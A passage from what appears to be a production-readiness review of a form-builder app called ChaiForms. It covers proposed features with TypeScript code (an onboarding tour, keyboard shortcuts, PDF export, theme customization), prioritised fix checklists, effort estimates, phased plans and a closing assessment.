    <Steps
      enabled={enabled}
      steps={steps}
      initialStep={0}
      onExit={onExit}
      options={{
        showProgress: true,
        showBullets: false,
        exitOnOverlayClick: false,
      }}
    />
  );
}

// Usage in dashboard
export default function DashboardPage() {
  const [showTour, setShowTour] = useState(false);

  useEffect(() => {
    const hasSeenTour = localStorage.getItem("dashboard-tour-completed");
    if (!hasSeenTour) {
      setShowTour(true);
    }
  }, []);

  const handleTourExit = () => {
    localStorage.setItem("dashboard-tour-completed", "true");
    setShowTour(false);
  };

  return (
    <>
      <DashboardTour enabled={showTour} onExit={handleTourExit} />
      {/* ... dashboard content ... */}
    </>
  );
}
```

**Acceptance Criteria:**

- [ ] Tour shown to new users
- [ ] Tour can be replayed from settings
- [ ] Tour covers key features
- [ ] Tour is skippable

**Estimated Effort:** 8 hours

---

### ⌨️ Add Keyboard Shortcuts

**Current State:** No keyboard navigation

**Implementation:**

```typescript
// apps/web/hooks/use-keyboard-shortcuts.ts
import { useEffect } from "react";

export function useKeyboardShortcuts(shortcuts: Record<string, () => void>) {
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      const key = [
        e.ctrlKey && "ctrl",
        e.metaKey && "cmd",
        e.shiftKey && "shift",
        e.altKey && "alt",
        e.key.toLowerCase(),
      ]
        .filter(Boolean)
        .join("+");

      const handler = shortcuts[key];
      if (handler) {
        e.preventDefault();
        handler();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [shortcuts]);
}

// Usage in form builder
export function FormBuilder() {
  const router = useRouter();

  useKeyboardShortcuts({
    "cmd+s": () => saveForm(),
    "cmd+p": () => openPreview(),
    "cmd+k": () => openCommandPalette(),
    "cmd+z": () => undo(),
    "cmd+shift+z": () => redo(),
    escape: () => closeModal(),
  });

  return <div>...</div>;
}
```

```typescript
// apps/web/components/command-palette.tsx
import { Command } from "cmdk";

export function CommandPalette({ open, onClose }: Props) {
  return (
    <Command.Dialog open={open} onOpenChange={onClose}>
      <Command.Input placeholder="Type a command or search..." />
      <Command.List>
        <Command.Group heading="Forms">
          <Command.Item onSelect={() => router.push("/dashboard/forms/new")}>
            Create New Form
          </Command.Item>
          <Command.Item onSelect={() => router.push("/dashboard")}>
            View All Forms
          </Command.Item>
        </Command.Group>
        <Command.Group heading="Navigation">
          <Command.Item onSelect={() => router.push("/explore")}>
            Explore Public Forms
          </Command.Item>
          <Command.Item onSelect={() => router.push("/templates")}>
            Browse Templates
          </Command.Item>
        </Command.Group>
      </Command.List>
    </Command.Dialog>
  );
}
```

**Acceptance Criteria:**

- [ ] Cmd+K opens command palette
- [ ] Cmd+S saves form
- [ ] Keyboard shortcuts documented in help modal
- [ ] Shortcuts work across all pages

**Estimated Effort:** 6 hours

---

### 📊 Add Form Analytics Export (PDF)

**Current State:** Only CSV export

**Implementation:**

```bash
pnpm add puppeteer
```

```typescript
// packages/services/export/pdf-export.service.ts
import puppeteer from "puppeteer";

export class PdfExportService {
  async generateFormAnalyticsReport(formId: string): Promise<Buffer> {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    // Render analytics page
    await page.goto(`${process.env.WEB_BASE_URL}/dashboard/forms/${formId}/analytics?print=true`, {
      waitUntil: "networkidle0",
    });

    // Generate PDF
    const pdf = await page.pdf({
      format: "A4",
      printBackground: true,
      margin: {
        top: "20mm",
        right: "20mm",
        bottom: "20mm",
        left: "20mm",
      },
    });

    await browser.close();
    return pdf;
  }
}

export const pdfExportService = new PdfExportService();
```

```typescript
// packages/trpc/server/routes/analytics/route.ts
exportPdf: protectedProcedure
  .input(z.object({ formId: z.string().uuid() }))
  .mutation(async ({ input, ctx }) => {
    await assertOwnership(input.formId, ctx.user.id);

    const pdf = await pdfExportService.generateFormAnalyticsReport(input.formId);

    // Return as base64
    return {
      filename: `analytics-${input.formId}.pdf`,
      data: pdf.toString("base64"),
    };
  }),
```

**Acceptance Criteria:**

- [ ] PDF export includes charts
- [ ] PDF export includes summary stats
- [ ] PDF is branded with form theme
- [ ] Export button in analytics page

**Estimated Effort:** 8 hours

---

### 🎨 Add Theme Customization

**Current State:** 8 fixed themes, no customization

**Implementation:**

```typescript
// packages/database/models/form.ts
export const formsTable = pgTable("forms", {
  // ... existing fields ...
  customTheme: jsonb("custom_theme").$type<{
    primaryColor?: string;
    backgroundColor?: string;
    textColor?: string;
    fontFamily?: string;
  }>(),
});
```

```typescript
// apps/web/components/theme-customizer.tsx
export function ThemeCustomizer({ formId }: Props) {
  const [customTheme, setCustomTheme] = useState({
    primaryColor: "#f97316",
    backgroundColor: "#0f172a",
    textColor: "#ffffff",
  });

  const updateTheme = trpc.forms.updateCustomTheme.useMutation();

  const handleSave = () => {
    updateTheme.mutate({
      formId,
      customTheme,
    });
  };

  return (
    <div className="space-y-4">
      <div>
        <label>Primary Color</label>
        <input
          type="color"
          value={customTheme.primaryColor}
          onChange={(e) =>
            setCustomTheme({ ...customTheme, primaryColor: e.target.value })
          }
        />
      </div>
      <div>
        <label>Background Color</label>
        <input
          type="color"
          value={customTheme.backgroundColor}
          onChange={(e) =>
            setCustomTheme({ ...customTheme, backgroundColor: e.target.value })
          }
        />
      </div>
      <button onClick={handleSave}>Save Theme</button>
    </div>
  );
}
```

**Acceptance Criteria:**

- [ ] Users can customize colors
- [ ] Users can upload custom fonts
- [ ] Preview updates in real-time
- [ ] Custom themes saved per form

**Estimated Effort:** 12 hours

---

## SUMMARY: PRODUCTION READINESS CHECKLIST

### 🚨 P0 — CRITICAL (Must Fix Before Launch)

**Security (Estimated: 22 hours)**

- [ ] Fix form password brute force vulnerability (4h)
- [ ] Sanitize user input to prevent XSS (6h)
- [ ] Add CSRF token expiry (2h)
- [ ] Implement Content Security Policy (3h)
- [ ] Add refresh token rotation (6h)
- [ ] Increase minimum password length to 8 characters (1h)

**Infrastructure (Estimated: 30 hours)**

- [ ] Set up CI/CD pipeline with GitHub Actions (16h)
- [ ] Add Sentry error tracking (4h)
- [ ] Implement structured logging with correlation IDs (4h)
- [ ] Add Prometheus metrics (4h)
- [ ] Create health checks with database connectivity (2h)

**Total P0 Effort: 52 hours (~1.5 weeks)**

---

### ⚠️ P1 — HIGH PRIORITY (Launch Blockers)

**Database (Estimated: 40 hours)**

- [ ] Redesign answers table to avoid EAV anti-pattern (16h)
- [ ] Add composite indexes for common queries (4h)
- [ ] Create materialized views for analytics (8h)
- [ ] Implement table partitioning for responses (12h)

**Backend (Estimated: 48 hours)**

- [ ] Extract service layer from tRPC procedures (24h)
- [ ] Implement repository pattern (16h)
- [ ] Add transaction wrapper utility (4h)
- [ ] Create ownership check middleware (4h)

**Frontend (Estimated: 28 hours)**

- [ ] Implement code splitting (8h)
- [ ] Add loading skeletons (6h)
- [ ] Optimize images with next/image (4h)
- [ ] Add virtual scrolling for long lists (6h)
- [ ] Add error boundaries (4h)

**Observability (Estimated: 18 hours)**

- [ ] Set up Grafana dashboards (8h)
- [ ] Configure alerts (Slack/email) (6h)
- [ ] Enhance structured logging (4h)

**Total P1 Effort: 134 hours (~3.5 weeks)**

---

### 📋 P2 — MEDIUM PRIORITY (Post-Launch Improvements)

**Monorepo (Estimated: 24 hours)**

- [ ] Extract @repo/ui component library (12h)
- [ ] Implement Changesets for versioning (4h)
- [ ] Add Turbo remote caching (2h)
- [ ] Create @repo/types package (6h)

**API (Estimated: 36 hours)**

- [ ] Add webhook system (16h)
- [ ] Implement API keys for programmatic access (12h)
- [ ] Add API versioning (8h)

**Testing (Estimated: 40 hours)**

- [ ] Add E2E tests with Playwright (20h)
- [ ] Add frontend component tests (16h)
- [ ] Set up code coverage tracking (4h)

**Product (Estimated: 34 hours)**

- [ ] Add interactive onboarding tour (8h)
- [ ] Implement keyboard shortcuts (6h)
- [ ] Add PDF analytics export (8h)
- [ ] Add theme customization (12h)

**Total P2 Effort: 134 hours (~3.5 weeks)**

---

## TOTAL EFFORT ESTIMATE

| Priority  | Hours   | Weeks (40h/week) |
| --------- | ------- | ---------------- |
| P0        | 52      | 1.5              |
| P1        | 134     | 3.5              |
| P2        | 134     | 3.5              |
| **TOTAL** | **320** | **8 weeks**      |

---

## RECOMMENDED IMPLEMENTATION PHASES

### Phase 1: Security & Infrastructure (Weeks 1-2)

**Goal:** Make the app secure and deployable

1. Fix all P0 security vulnerabilities
2. Set up CI/CD pipeline
3. Add error tracking and logging
4. Configure health checks

**Deliverable:** Secure, deployable application with basic observability

---

### Phase 2: Database & Backend (Weeks 3-5)

**Goal:** Optimize for scale and maintainability

1. Redesign answers table
2. Add database indexes and materialized views
3. Extract service layer
4. Implement repository pattern
5. Set up Grafana dashboards

**Deliverable:** Scalable backend that can handle 100k+ responses

---

### Phase 3: Frontend, UX & Advanced Database Scaling (Weeks 6-8)

**Goal:** Improve performance, user experience, and database scale

1. Implement code splitting
2. Add loading skeletons
3. Optimize images
4. Add error boundaries
5. Implement virtual scrolling
6. Implement table partitioning

**Deliverable:** Fast, polished frontend with excellent UX and scalable database

---

### Phase 4: Testing & Polish (Week 8)

**Goal:** Ensure quality and add nice-to-haves

1. Add E2E tests
2. Add component tests
3. Implement onboarding tour
4. Add keyboard shortcuts
5. Extract UI component library

**Deliverable:** Production-ready, well-tested application

---

## WOULD PASS PRODUCTION REVIEW?

### Current State (Score: 72/100)

| Organization Type    | Pass?          | Reasoning                                                         |
| -------------------- | -------------- | ----------------------------------------------------------------- |
| **Startup**          | ⚠️ Conditional | Good MVP, but security issues are blockers. Fix P0 items first.   |
| **Mid-size Company** | ❌ No          | Missing observability, database will struggle at scale, no CI/CD. |
| **FAANG**            | ❌ No          | Unacceptable for production. Needs all P0 + P1 items.             |

### After P0 Fixes (Score: 78/100)

| Organization Type    | Pass?          | Reasoning                                                           |
| -------------------- | -------------- | ------------------------------------------------------------------- |
| **Startup**          | ✅ Yes         | Secure, deployable, good enough for early customers.                |
| **Mid-size Company** | ⚠️ Conditional | Needs database optimization and better observability.               |
| **FAANG**            | ❌ No          | Still missing service layer, testing, and scalability improvements. |

### After P0 + P1 (Score: 88/100)

| Organization Type    | Pass?          | Reasoning                                         |
| -------------------- | -------------- | ------------------------------------------------- |
| **Startup**          | ✅ Yes         | Production-ready, can scale to 100k users.        |
| **Mid-size Company** | ✅ Yes         | Solid architecture, good observability, scalable. |
| **FAANG**            | ⚠️ Conditional | Needs comprehensive testing and API versioning.   |

### After All Phases (Score: 92/100)

| Organization Type    | Pass?  | Reasoning                                                                         |
| -------------------- | ------ | --------------------------------------------------------------------------------- |
| **Startup**          | ✅ Yes | Excellent quality, competitive with Typeform/Tally.                               |
| **Mid-size Company** | ✅ Yes | Enterprise-ready, well-tested, maintainable.                                      |
| **FAANG**            | ✅ Yes | Meets production standards. Could still improve: multi-region, advanced security. |

---

## WHAT A STAFF+ ENGINEER WOULD PRIORITIZE

If I were taking over this project as a Staff+ engineer, here's what I'd do **first**:

### Week 1: Stop the Bleeding (Security)

1. **Day 1:** Fix password brute force vulnerability
2. **Day 2:** Add XSS sanitization
3. **Day 3:** Implement CSP headers
4. **Day 4:** Add Sentry error tracking
5. **Day 5:** Set up basic CI/CD

**Why:** Security vulnerabilities are existential risks. Everything else can wait.

### Week 2: Visibility (Observability)

1. Set up structured logging
2. Add Prometheus metrics
3. Create Grafana dashboards
4. Configure alerts

**Why:** Can't fix what you can't see. Need visibility before scaling.

### Week 3-4: Foundation (Architecture)

1. Extract service layer
2. Implement repository pattern
3. Add database indexes
4. Create materialized views

**Why:** Technical debt compounds. Fix architecture before it's too late.

### Week 5-6: Scale (Database)

1. Redesign answers table
2. Add Redis caching
3. Optimize queries

**Why:** Database is the bottleneck. Fix it before hitting scale issues.

### Week 7-8: Quality & Advanced Scale (Testing, Polish & Partitioning)

1. Add E2E tests
2. Add component tests
3. Implement code splitting
4. Add loading skeletons
5. Implement table partitioning

**Why:** Quality is a feature. Advanced scaling ensures future-proofing.

---

## FINAL RECOMMENDATIONS

### For Immediate Launch (Minimum Viable Production)

**Complete P0 items only** — 52 hours (~1.5 weeks)

This gets you:

- ✅ Secure application
- ✅ Deployable with CI/CD
- ✅ Basic error tracking
- ✅ Health checks

**Risk:** Will struggle at scale, limited observability

---

### For Sustainable Growth (Recommended)

**Complete P0 + P1 items** — 186 hours (~5 weeks)

This gets you:

- ✅ Everything in MVP
- ✅ Scalable database
- ✅ Clean architecture
- ✅ Full observability
- ✅ Performance optimizations

**Risk:** Limited testing, some UX rough edges

---

### For Enterprise Readiness (Ideal)

**Complete all phases** — 320 hours (~8 weeks)

This gets you:

- ✅ Everything in Sustainable Growth
- ✅ Comprehensive testing
- ✅ Polished UX
- ✅ API versioning
- ✅ Webhook integrations

**Risk:** None. Production-ready for any scale.

---

## CONCLUSION

ChaiForms is a **well-executed MVP** that demonstrates solid engineering fundamentals. The engineer behind this shows **mid-to-senior level competency** with modern TypeScript/React/tRPC patterns.

**Strengths:**

- Clean monorepo structure
- Type-safe API with tRPC
- Impressive form engine with conditional logic
- Beautiful UI with 8 themes
- Good test coverage for backend

**Critical Gaps:**

- Security vulnerabilities (XSS, brute force)
- No CI/CD or observability
- Database will struggle at scale
- Missing service layer
- No E2E tests

**Verdict:** With **5 weeks of focused work** (P0 + P1), this becomes a production-ready SaaS that can compete with Typeform and Tally. Without these fixes, it's a great demo but not ready for real users.

**Recommended Next Steps:**

1. Fix security issues (Week 1)
2. Add observability (Week 2)
3. Optimize database (Weeks 3-4)
4. Refactor architecture (Week 5)

After these improvements, ChaiForms will be a **Staff+ level project** ready for enterprise customers.

---

**Document Version:** 1.0  
**Last Updated:** 2026-05-25  
**Estimated Total Effort:** 320 hours (8 weeks)  
**Priority Distribution:** P0 (16%), P1 (42%), P2 (42%)
